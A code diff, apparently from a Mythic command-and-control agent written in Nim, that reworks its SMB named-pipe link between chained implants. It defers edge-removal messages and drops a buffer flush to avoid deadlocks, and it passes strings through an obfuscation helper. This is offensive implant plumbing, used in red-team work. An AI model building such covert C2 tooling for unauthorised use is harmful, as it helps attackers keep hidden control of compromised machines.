@@ -51,25 +51,27 @@ type
   LinkConnectionObj = object
     agentUuid: string
     pipeHandle: HANDLE
-    active: bool
-    receivedEof: bool  # True when reader thread sends empty seq EOF signal
+    active*: bool
+    receivedEof*: bool  # True when reader thread sends empty seq EOF signal
+    edgeRemovalSent: bool  # True after edge removal has been sent (2-phase)
     readerReady: bool  # True when reader thread is ready and waiting on ReadFile
-    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
+    inChannel*: ptr Channel[seq[byte]]   # Mythic → Writer → Pipe
     outChannel: ptr Channel[seq[byte]]  # Pipe → Reader → Mythic
     readerThread: Thread[ptr LinkConnectionObj]
     writerThread: Thread[ptr LinkConnectionObj]
   
-  LinkConnection = ref object
-    agentUuid: string
-    pipeHandle: HANDLE
-    active: bool
-    receivedEof: bool
+  LinkConnection* = ref object
+    agentUuid*: string
+    pipeHandle*: HANDLE
+    active*: bool
+    receivedEof*: bool
+    edgeRemovalSent: bool
     readerReady: bool
-    inChannel: ptr Channel[seq[byte]]
+    inChannel*: ptr Channel[seq[byte]]
     outChannel: ptr Channel[seq[byte]]
     readerThread: Thread[ptr LinkConnectionObj]
     writerThread: Thread[ptr LinkConnectionObj]
-    sharedPtr: ptr LinkConnectionObj  # Stable pointer for threads
+    sharedPtr*: ptr LinkConnectionObj  # Stable pointer for threads
 
 var
   activeLinkConnections* {.threadvar.}: Table[string, LinkConnection]
@@ -146,14 +148,10 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: seq[byte]): bool =
       
       debug &"[DEBUG] Link: Wrote {bytesWritten} bytes of chunk data successfully"
   
-  # Flush pipe buffers to ensure data is sent immediately
-  debug "[DEBUG] Link: About to call FlushFileBuffers"
-  let flushResult = FlushFileBuffers(pipeHandle)
-  debug &"[DEBUG] Link: FlushFileBuffers result={flushResult}"
-  if flushResult == 0:
-    let err = GetLastError()
-    debug &"[DEBUG] Link: FlushFileBuffers failed, error: {err}"
-  
+  # Note: FlushFileBuffers intentionally NOT called here.
+  # On named pipes, it blocks until the remote end reads ALL data,
+  # which can deadlock the writer thread on large messages.
+  # WriteFile on a synchronous pipe already writes to the kernel buffer.
   debug "[DEBUG] Link: Message sent successfully"
   return true
 
@@ -340,27 +338,36 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
     return
   
   for agentUuid, conn in activeLinkConnections:
+    # Two-phase edge removal: if EOF was detected in a PREVIOUS cycle,
+    # send the edge removal now (in its own post_response, after all data is sent)
+    if conn.receivedEof and not conn.edgeRemovalSent:
+      debug &"[DEBUG] Link: Sending deferred edge removal for {agentUuid}"
+      result.add(%*{
+        obf("edges"): [
+          %*{
+            obf("source"): "",  # Will be filled by agent
+            obf("destination"): agentUuid,
+            obf("action"): obf("remove"),
+            obf("c2_profile"): "smb"
+          }
+        ]
+      })
+      conn.edgeRemovalSent = true
+      toDelete.add(agentUuid)
+      continue
+
     # Check for data from thread (non-blocking) - drain channel even if inactive
     var (hasData, data) = conn.outChannel[].tryRecv()
     
-    debug &"[DEBUG] Link: Checking connection for {agentUuid}, hasData: {hasData}, dataLen: {data.len}"
+    if hasData:
+      debug &"[DEBUG] Link: Data from {agentUuid}, dataLen: {data.len}"
     
     while hasData:
       if data.len == 0:
-        # EOF signal from reader thread
-        debug &"[DEBUG] Link: Connection to {agentUuid} EOF received from reader thread"
-        
-        # Send edge removal notification
-        result.add(%*{
-          obf("edges"): [
-            %*{
-              obf("source"): "",  # Will be filled by agent
-              obf("destination"): agentUuid,
-              obf("action"): obf("remove"),
-              obf("c2_profile"): "smb"
-            }
-          ]
-        })
+        # EOF signal from reader thread - mark for edge removal on NEXT cycle
+        # This ensures all buffered delegate data is sent to Mythic first,
+        # and the edge removal arrives in a separate post_response as the last message
+        debug &"[DEBUG] Link: Connection to {agentUuid} EOF received from reader thread, deferring edge removal"
         
         conn.active = false
         if not conn.sharedPtr.isNil:
@@ -394,10 +401,6 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
       
       # Check for more data
       (hasData, data) = conn.outChannel[].tryRecv()
-    
-    # Only delete if we've received EOF signal from reader thread
-    if conn.receivedEof:
-      toDelete.add(agentUuid)
   
   # Rekey connections with real UUIDs
   for item in toRekey:
